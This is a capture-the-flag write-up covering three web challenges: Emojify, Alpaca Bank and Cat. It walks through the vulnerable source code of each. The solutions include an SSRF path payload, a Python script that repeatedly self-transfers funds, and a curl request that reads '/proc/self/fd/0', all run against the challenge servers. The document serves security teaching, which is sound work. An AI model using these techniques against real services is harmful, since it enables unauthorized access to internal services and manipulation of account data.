--------------

### AlpacaDaily

--------------

<img width="1212" height="254" alt="image" src="https://github.com/user-attachments/assets/9863be4c-9526-41aa-b2a7-5b088e7c098d" />

--------------

- Web
   - Emojify
   - Alpaca Bank

--------------

### Emojify

--------------

<img width="848" height="473" alt="image" src="https://github.com/user-attachments/assets/1063eff2-c7e7-424a-9618-b4d01cdb4fb1" />

---------------

- Frontend js code-:

```js
import express from "express";
import fs from "node:fs";

const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
};

express()
  .get("/", (req, res) => res.type("html").send(fs.readFileSync("index.html")))
  .get("/api", async (req, res) => {
    try {
      const path = waf(req.query.path);
      const url = new URL(path, "http://backend:3000");
      const emoji = await fetch(url).then((r) => r.text());
      res.send(emoji);
    } catch (err) {
      res.send(err.message);
    }
  })
  .listen(3000);
```

- Waf function checks if the path is a `string`, it starts with `/` or includes `emoji`.It throws an error if it appears otherwise.-:

```js
const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
};
```

- The `/api/` route checks the query param which is passed to `new Url()` to form a path for `http://backend:3000` like `http://backend:3000/zzzz` if the path is `zzzz`.It passes to the `fetch()` to make a request.`Url()` is the vulnerable part but we'll get back to it later.

```js
express()
  .get("/", (req, res) => res.type("html").send(fs.readFileSync("index.html")))
  .get("/api", async (req, res) => {
    try {
      const path = waf(req.query.path);
      const url = new URL(path, "http://backend:3000");
      const emoji = await fetch(url).then((r) => r.text());
      res.send(emoji);
    } catch (err) {
      res.send(err.message);
    }
```
- Backtend code does nothing but sends an emoji-:

```js
import express from "express";
import * as emoji from "node-emoji";

express()
  .get("/emoji/:text", (req, res) =>
    res.send(emoji.get(req.params.text) ?? "❓")
  )
  .listen(3000);
```

- Last backend url is `secret:1337`.Code-:

```js
import express from "express";

const FLAG = process.env.FLAG ?? "Alpaca{REDACTED}";

express()
  // http://secret:1337/flag
  .get("/flag", (req, res) => res.send(FLAG))
  .listen(1337);
```
-  The route `/flag` returns the flag.
-  I checked [MDN-Web Apis](https://developer.mozilla.org/en-US/docs/Web/API/URL) for important info on Url(). If a relative url like `//secret:1337/flag` is passed as the first argument, it is picked over the absolute url as seen here.We can exploit this quirk to read this flag.

```js
new URL("//foo.example", "https://example.com");
// => 'https://foo.example/' (see relative URLs)
```

- Exploitng it
```js
"//secret:1337/flag?emoji"//I passed emoji as a query since it is required
```

- Using curl-:

```bash
curl http://34.170.146.252:5737/api\?path\=//secret:1337/flag\?emoji                                                                                                              
Alpaca{Sup3r_Speci4l_Rar3_Flag}%
```

------------

### Alpaca Bank

------------

<img width="818" height="499" alt="image" src="https://github.com/user-attachments/assets/be871ce6-0f9a-4c32-b21b-17ecf43169e5" />


------------

- Code-:

```js
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();

const FLAG = process.env.FLAG ?? "Alpaca{**** REDACTED ****}";
const TRILLION = 1_000_000_000_000;

app.use(express.json());

const users = new Set();
const balances = new Map();

app.post('/api/register', (req, res) => {
    const id = crypto.randomBytes(10).toString('hex');
    users.add(id);
    balances.set(id, 10); // Initial balance
    res.status(201).json({ user: id });
});

app.get('/api/user/:user', (req, res) => {
    const user = req.params.user;
    if (!users.has(user)) return res.status(404).send({ error: 'User not found' });
    res.status(200).json({
        user: user,
        balance: balances.get(user),
        flag: balances.get(user) >= TRILLION ? FLAG : null // 🚩
    });
});

app.post('/api/transfer', (req, res) => {
    const { fromUser, toUser, amount } = req.body;

    if (!Number.isInteger(amount) || amount <= 0) {
        return res.status(400).send({ error: 'Invalid amount' });
    }
    if (!users.has(fromUser) || !users.has(toUser)) {
        return res.status(400).send({ error: 'Invalid user ID' });
    }

    const fromBalance = balances.get(fromUser);
    const toBalance = balances.get(toUser);
    if (fromBalance < amount) {
        return res.status(400).send({ error: 'Insufficient funds' });
    }
    
    balances.set(fromUser, fromBalance - amount);
    balances.set(toUser, toBalance + amount);

    res.status(200).json({
        receipt: `${fromUser} -> ${toUser} (${amount} yen)`
    });
});
```

- Vulnerable route is `/api/transfer`-:

```js
app.post('/api/transfer', (req, res) => {
    const { fromUser, toUser, amount } = req.body;

    if (!Number.isInteger(amount) || amount <= 0) {
        return res.status(400).send({ error: 'Invalid amount' });
    }
    if (!users.has(fromUser) || !users.has(toUser)) {
        return res.status(400).send({ error: 'Invalid user ID' });
    }

    const fromBalance = balances.get(fromUser);
    const toBalance = balances.get(toUser);
    if (fromBalance < amount) {
        return res.status(400).send({ error: 'Insufficient funds' });
    }
    
    balances.set(fromUser, fromBalance - amount);
    balances.set(toUser, toBalance + amount);

    res.status(200).json({
        receipt: `${fromUser} -> ${toUser} (${amount} yen)`
    });
});
```

- Although, the code allows strict check for the amount passed to avoid negative figures or data types.

```js
 const { fromUser, toUser, amount } = req.body;

    if (!Number.isInteger(amount) || amount <= 0) {
        return res.status(400).send({ error: 'Invalid amount' });
    }
    if (!users.has(fromUser) || !users.has(toUser)) {
        return res.status(400).send({ error: 'Invalid user ID' });
    }
```

- But, it doesn't restrict self-transfer for ids.Also, in the implementation of `fromBalance` and `toBalance`, if a user send an amount equals to his balance, it deducts it from the actual balance which will be the `10` and also adds it back to the same balance since it is the same balance which is like double additon of the amount.A trillion is required to buy the flag, we can do this repeatedly and increasing the amount to get the flag.

```js
balances.set(fromUser, fromBalance - amount);
    balances.set(toUser, toBalance + amount);
```

- Proof-of-concept-:

```python3
#! /usr/bin/env python3
import requests
import asyncio

url = "http://34.170.146.252:48620"
user_id = requests.post(url + "/api/register").json()["user"]

async def check_balance(user_id: str) -> int:
    data = requests.get(url+"/api/user/"+user_id).json()
    print(data)
    if  data["flag"] != None:
        print(data["flag"])
        exit()
    return data["balance"]
async def main():
    while True: 
      balance = await check_balance(user_id)
      data = {"fromUser":user_id,"toUser":user_id,"amount": balance}
      headers =  {"Content-Type":"application/json"}
      requests.post(url+"/api/transfer",json=data)

if __name__ == "__main__":
    asyncio.run(main())
```

- Flag-:```Alpaca{this_weekend_is_SECCON_CTF_14_Quals_dont_miss_it}```

<img width="1597" height="790" alt="image" src="https://github.com/user-attachments/assets/5e190596-0320-4593-9264-6e764c76a85d" />

-----------

### Cat

-----------

<img width="838" height="376" alt="image" src="https://github.com/user-attachments/assets/49154e38-3b1d-44b3-8828-1c83d838a368" />

------------

- `App.py`-:

```python3
@app.get("/cat")
def cat():
    file = request.args.get("file", "app.py")
    if not Path(file).exists():
        return "🚫"
    if "flag" in file:
        return "🚩"

    return subprocess.run(
        ["cat", file],
        capture_output=True,
        timeout=1,
        stdin=open("flag.txt"),  # !!
    ).stdout.decode()
```

- The code receives the `file` parameter and passes it to `Path(file).exist()` to check if it exists and also if the word `flag` is in it.
```python3
file = request.args.get("file", "app.py")
    if not Path(file).exists():
        return "🚫"
    if "flag" in file:
        return "🚩"
```
- It passes the file to `cat` to read the file.Also, it reads `flag.txt` with open and passes to stdin.

```python3
 return subprocess.run(
        ["cat", file],
        capture_output=True,
        timeout=1,
        stdin=open("flag.txt"),  # !!
    ).stdout.decode()
```

- The `stdin` arg in python3's subprocess allows 4 values. Our case is an existing file object which is based on a file descriptor.

```
- None (default): No redirection occurs; the child process inherits the parent process's standard input file handle.
subprocess.PIPE: A new pipe is created between the parent and child processes. This allows the Python program to write data to the subprocess's standard input using methods like Popen.communicate() or Popen.stdin.write().
- subprocess.DEVNULL: Indicates that the special file os.devnull will be used, effectively discarding any input intended for the subprocess.
- An existing file descriptor (a positive integer): The subprocess will use this specific operating system file descriptor for its input.
- An existing file object: Any object with a fileno() method (e.g., an opened file using open()) can be passed, and its underlying file descriptor will be used. 
```

> A file descriptor (FD) is a small, non-negative integer that the operating system uses as a unique identifier for an open file or other input/output (I/O) resource.
> 0 (STDIN_FILENO): Standard input, typically connected to the keyboard.
> 1 (STDOUT_FILENO): Standard output, typically connected to the terminal/console screen.
> 2 (STDERR_FILENO): Standard error, used for outputting error messages, also typically connected to the terminal/console screen.

- File descriptors can be accessed on linux with `/proc/<pid>/fd` but in our case, the pid will be `self` and we'll pass `0` to represent stdin after `fd/0`.

>/proc/self/fd/0

- Flag-:```Alpaca{https://http.cat/100}```

```bash
╮
╰─❯ curl http://34.170.146.252:29656/cat\?file\=/proc/self/fd/0                                                                               
Alpaca{https://http.cat/100}
```

------------

